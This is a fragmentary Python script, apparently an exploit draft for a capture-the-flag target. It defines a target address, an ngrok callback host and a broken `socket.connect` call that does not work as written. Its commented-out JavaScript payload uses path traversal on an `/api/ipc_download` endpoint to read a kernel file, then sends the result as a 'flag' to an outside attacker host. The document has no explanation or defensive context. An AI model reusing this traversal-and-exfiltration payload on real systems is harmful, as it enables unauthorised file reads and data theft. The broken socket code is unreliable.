import socket


TARGET_IP = "94.237.51.159"
TARGET_PORT = 36542
HOST = "https://bcca-98-177-220-28.ngrok-free.app"
PORT = 80

s = socket.connect((TARGET_IP, TARGET_PORT))


# var request = new XMLHttpRequest();
# request.open('GET', '/api/ipc_download?file=../../../../../proc/sys/kernel/random/boot_id', false);
# request.send();

# var flag = request.responseText;
# window.location.href = "http://xpl.xanhacks.xyz:4444?flag=" + flag;